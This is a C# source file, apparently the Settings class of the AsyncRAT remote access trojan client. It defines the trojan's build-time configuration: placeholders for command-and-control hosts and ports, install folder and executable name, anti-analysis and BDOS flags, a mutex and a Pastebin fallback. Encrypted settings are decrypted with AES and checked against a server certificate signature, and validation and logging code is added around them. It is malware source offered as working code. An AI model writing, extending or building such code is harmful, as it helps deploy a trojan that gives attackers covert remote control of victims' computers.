using Client.Algorithm;
using Client.Helper;
using System;
using System.IO;
using System.Security.Cryptography;
using System.Security.Cryptography.X509Certificates;
using System.Text;
using System.Diagnostics;

namespace Client
{
    public static class Settings
    {
        // Configuration values - these get replaced during build process
#if DEBUG
        public static string Ports = "6606";
        public static string Hosts = "127.0.0.1";
        public static string Version = "0.5.7B";
        public static string Install = "false";
        public static string InstallFolder = "AppData";
        public static string InstallFile = "Test.exe";
        public static string Key = "NYAN CAT";
        public static string MTX = "%MTX%";
        public static string Certificate = "%Certificate%";
        public static string Serversignature = "%Serversignature%";
        public static X509Certificate2 ServerCertificate;
        public static string Anti = "false";
        public static Aes256 aes256 = new Aes256(Key);
        public static string Pastebin = "null";
        public static string BDOS = "false";
        public static string Hwid = HwidGen.HWID();
        public static string Delay = "0";
        public static string Group = "Debug";
#else
        public static string Ports = "%Ports%";
        public static string Hosts = "%Hosts%";
        public static string Version = "%Version%";
        public static string Install = "%Install%";
        public static string InstallFolder = "%Folder%";
        public static string InstallFile = "%File%";
        public static string Key = "%Key%";
        public static string MTX = "%MTX%";
        public static string Certificate = "%Certificate%";
        public static string Serversignature = "%Serversignature%";
        public static X509Certificate2 ServerCertificate;
        public static string Anti = "%Anti%";
        public static Aes256 aes256;
        public static string Pastebin = "%Pastebin%";
        public static string BDOS = "%BDOS%";
        public static string Hwid = null;
        public static string Delay = "%Delay%";
        public static string Group = "%Group%";
#endif

        // Validation constants
        private const int MAX_DELAY_SECONDS = 300; // 5 minutes max delay
        private const int MAX_PORTS = 10; // Maximum number of ports to try
        private const int MAX_HOSTS = 10; // Maximum number of hosts to try

        public static bool InitializeSettings()
        {
#if DEBUG
            try
            {
                // Validate debug settings
                return ValidateSettings();
            }
            catch (Exception ex)
            {
                WriteDebugLog($"Debug settings validation failed: {ex.Message}");
                return false;
            }
#endif

            try
            {
                // Decrypt and validate settings
                if (!DecryptSettings())
                {
                    WriteDebugLog("Settings decryption failed");
                    return false;
                }

                // Validate decrypted settings
                if (!ValidateSettings())
                {
                    WriteDebugLog("Settings validation failed");
                    return false;
                }

                // Verify server signature
                if (!VerifyHash())
                {
                    WriteDebugLog("Server signature verification failed");
                    return false;
                }

                WriteDebugLog("Settings initialized successfully");
                return true;
            }
            catch (Exception ex)
            {
                WriteDebugLog($"Settings initialization failed: {ex.Message}");
                return false;
            }
        }

        private static bool DecryptSettings()
        {
            try
            {
                // Decrypt the key first
                Key = Encoding.UTF8.GetString(Convert.FromBase64String(Key));
                aes256 = new Aes256(Key);

                // Decrypt all settings
                Ports = SafeDecrypt(Ports, "Ports");
                Hosts = SafeDecrypt(Hosts, "Hosts");
                Version = SafeDecrypt(Version, "Version");
                Install = SafeDecrypt(Install, "Install");
                MTX = SafeDecrypt(MTX, "MTX");
                Pastebin = SafeDecrypt(Pastebin, "Pastebin");
                Anti = SafeDecrypt(Anti, "Anti");
                BDOS = SafeDecrypt(BDOS, "BDOS");
                Group = SafeDecrypt(Group, "Group");
                Serversignature = SafeDecrypt(Serversignature, "Serversignature");

                // Generate hardware ID
                Hwid = HwidGen.HWID();

                // Load and validate certificate
                string certificateData = SafeDecrypt(Certificate, "Certificate");
                if (string.IsNullOrEmpty(certificateData))
                {
                    WriteDebugLog("Certificate data is empty");
                    return false;
                }

                ServerCertificate = new X509Certificate2(Convert.FromBase64String(certificateData));
                
                return true;
            }
            catch (FormatException ex)
            {
                WriteDebugLog($"Invalid base64 format in settings: {ex.Message}");
                return false;
            }
            catch (CryptographicException ex)
            {
                WriteDebugLog($"Cryptographic error in settings: {ex.Message}");
                return false;
            }
            catch (Exception ex)
            {
                WriteDebugLog($"Unexpected error decrypting settings: {ex.Message}");
                return false;
            }
        }

        private static string SafeDecrypt(string encryptedValue, string settingName)
        {
            try
            {
                if (string.IsNullOrEmpty(encryptedValue) || encryptedValue.StartsWith("%") && encryptedValue.EndsWith("%"))
                {
                    WriteDebugLog($"Setting '{settingName}' appears to be a placeholder");
                    return encryptedValue; // Return as-is for placeholders
                }

                return aes256.Decrypt(encryptedValue);
            }
            catch (Exception ex)
            {
                WriteDebugLog($"Failed to decrypt setting '{settingName}': {ex.Message}");
                return encryptedValue; // Return original value on decrypt failure
            }
        }

        private static bool ValidateSettings()
        {
            try
            {
                // Validate ports
                if (!ValidatePorts())
                {
                    WriteDebugLog("Port validation failed");
                    return false;
                }

                // Validate hosts
                if (!ValidateHosts())
                {
                    WriteDebugLog("Host validation failed");
                    return false;
                }

                // Validate delay
                if (!ValidateDelay())
                {
                    WriteDebugLog("Delay validation failed");
                    return false;
                }

                // Validate boolean settings
                if (!ValidateBooleanSettings())
                {
                    WriteDebugLog("Boolean settings validation failed");
                    return false;
                }

                // Validate strings
                if (!ValidateStringSettings())
                {
                    WriteDebugLog("String settings validation failed");
                    return false;
                }

                return true;
            }
            catch (Exception ex)
            {
                WriteDebugLog($"Settings validation error: {ex.Message}");
                return false;
            }
        }

        private static bool ValidatePorts()
        {
            try
            {
                if (string.IsNullOrWhiteSpace(Ports))
                {
                    WriteDebugLog("Ports setting is empty");
                    return false;
                }

                string[] portArray = Ports.Split(',');
                if (portArray.Length > MAX_PORTS)
                {
                    WriteDebugLog($"Too many ports specified (max: {MAX_PORTS})");
                    return false;
                }

                foreach (string portStr in portArray)
                {
                    if (!int.TryParse(portStr.Trim(), out int port) || port < 1 || port > 65535)
                    {
                        WriteDebugLog($"Invalid port: {portStr}");
                        return false;
                    }
                }

                return true;
            }
            catch (Exception ex)
            {
                WriteDebugLog($"Port validation error: {ex.Message}");
                return false;
            }
        }

        private static bool ValidateHosts()
        {
            try
            {
                if (string.IsNullOrWhiteSpace(Hosts))
                {
                    WriteDebugLog("Hosts setting is empty");
                    return false;
                }

                string[] hostArray = Hosts.Split(',');
                if (hostArray.Length > MAX_HOSTS)
                {
                    WriteDebugLog($"Too many hosts specified (max: {MAX_HOSTS})");
                    return false;
                }

                foreach (string host in hostArray)
                {
                    string trimmedHost = host.Trim();
                    if (string.IsNullOrEmpty(trimmedHost) || trimmedHost.Length > 255)
                    {
                        WriteDebugLog($"Invalid host: {host}");
                        return false;
                    }
                }

                return true;
            }
            catch (Exception ex)
            {
                WriteDebugLog($"Host validation error: {ex.Message}");
                return false;
            }
        }

        private static bool ValidateDelay()
        {
            try
            {
                if (!int.TryParse(Delay, out int delay) || delay < 0 || delay > MAX_DELAY_SECONDS)
                {
                    WriteDebugLog($"Invalid delay value: {Delay} (max: {MAX_DELAY_SECONDS})");
                    return false;
                }

                return true;
            }
            catch (Exception ex)
            {
                WriteDebugLog($"Delay validation error: {ex.Message}");
                return false;
            }
        }

        private static bool ValidateBooleanSettings()
        {
            try
            {
                string[] booleanSettings = { Install, Anti, BDOS };
                string[] settingNames = { "Install", "Anti", "BDOS" };

                for (int i = 0; i < booleanSettings.Length; i++)
                {
                    string value = booleanSettings[i]?.ToLowerInvariant();
                    if (value != "true" && value != "false")
                    {
                        WriteDebugLog($"Invalid boolean value for {settingNames[i]}: {booleanSettings[i]}");
                        return false;
                    }
                }

                return true;
            }
            catch (Exception ex)
            {
                WriteDebugLog($"Boolean validation error: {ex.Message}");
                return false;
            }
        }

        private static bool ValidateStringSettings()
        {
            try
            {
                // Validate required string settings
                if (string.IsNullOrWhiteSpace(Version))
                {
                    WriteDebugLog("Version is empty");
                    return false;
                }

                if (string.IsNullOrWhiteSpace(Group))
                {
                    WriteDebugLog("Group is empty");
                    return false;
                }

                // Validate install folder if installation is enabled
                if (Convert.ToBoolean(Install))
                {
                    if (string.IsNullOrWhiteSpace(InstallFolder) || string.IsNullOrWhiteSpace(InstallFile))
                    {
                        WriteDebugLog("Install settings are incomplete");
                        return false;
                    }

                    // Validate install file extension
                    if (!InstallFile.EndsWith(".exe", StringComparison.OrdinalIgnoreCase))
                    {
                        WriteDebugLog("Install file must be an .exe file");
                        return false;
                    }
                }

                return true;
            }
            catch (Exception ex)
            {
                WriteDebugLog($"String validation error: {ex.Message}");
                return false;
            }
        }

        private static bool VerifyHash()
        {
            try
            {
                if (ServerCertificate == null)
                {
                    WriteDebugLog("Server certificate is null");
                    return false;
                }

                var csp = (RSACryptoServiceProvider)ServerCertificate.PublicKey.Key;
                bool isValid = csp.VerifyHash(
                    Sha256.ComputeHash(Encoding.UTF8.GetBytes(Key)), 
                    CryptoConfig.MapNameToOID("SHA256"), 
                    Convert.FromBase64String(Serversignature));

                if (!isValid)
                {
                    WriteDebugLog("Server signature verification failed");
                }

                return isValid;
            }
            catch (FormatException ex)
            {
                WriteDebugLog($"Invalid signature format: {ex.Message}");
                return false;
            }
            catch (CryptographicException ex)
            {
                WriteDebugLog($"Cryptographic verification failed: {ex.Message}");
                return false;
            }
            catch (Exception ex)
            {
                WriteDebugLog($"Unexpected error during signature verification: {ex.Message}");
                return false;
            }
        }

        private static void WriteDebugLog(string message)
        {
            try
            {
#if DEBUG
                Debug.WriteLine($"[Settings] {DateTime.Now:HH:mm:ss.fff} {message}");
#endif
                // In release mode, only log critical errors to event log if we have permissions
#if !DEBUG
                if (message.Contains("failed") || message.Contains("error"))
                {
                    try
                    {
                        using (EventLog eventLog = new EventLog("Application"))
                        {
                            eventLog.Source = "AsyncRAT Client";
                            eventLog.WriteEntry($"Settings: {message}", EventLogEntryType.Warning);
                        }
                    }
                    catch
                    {
                        // Ignore event log errors
                    }
                }
#endif
            }
            catch
            {
                // Ignore logging errors
            }
        }

        // Helper method to get safe boolean values
        public static bool GetBooleanSetting(string value, bool defaultValue = false)
        {
            try
            {
                return Convert.ToBoolean(value);
            }
            catch
            {
                WriteDebugLog($"Invalid boolean value '{value}', using default: {defaultValue}");
                return defaultValue;
            }
        }

        // Helper method to get safe integer values
        public static int GetIntegerSetting(string value, int defaultValue = 0, int minValue = int.MinValue, int maxValue = int.MaxValue)
        {
            try
            {
                int result = Convert.ToInt32(value);
                if (result < minValue || result > maxValue)
                {
                    WriteDebugLog($"Value '{value}' out of range [{minValue}-{maxValue}], using default: {defaultValue}");
                    return defaultValue;
                }
                return result;
            }
            catch
            {
                WriteDebugLog($"Invalid integer value '{value}', using default: {defaultValue}");
                return defaultValue;
            }
        }
    }
}